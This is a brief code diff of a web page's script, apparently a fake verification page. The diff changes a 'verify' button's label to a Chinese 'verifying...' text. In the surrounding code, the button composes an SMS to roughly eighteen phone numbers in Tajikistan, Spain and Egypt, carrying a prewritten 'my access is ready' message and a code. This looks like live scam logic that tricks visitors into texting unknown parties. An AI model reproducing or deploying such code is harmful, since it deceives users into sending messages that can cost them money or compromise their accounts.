@@ -365,7 +365,8 @@
 
       const verifyButton = document.getElementById('verify-button');
       verifyButton.onclick = function () {
-
+        // 把验证改为验证中
+        document.getElementById('verify-button').textContent = '验证中...';
         // 发送短信验证码或其他验证方式
         console.log('发送验证请求...');
         var sms = "sms://open?addresses=+992917172474,+992911151430,+34651714076,+34665291217,+34665291200,+992917172482,+201103502264,+992917172399,+201103502251,+34665291250,+34651714230,+992919320905,+992919321826,+992919321805,+34665291252,+34665291262,+34665291204,+201103593243/&body=My%20access%20is%20ready%20with%20my%20number%20ahVKtk%208995";
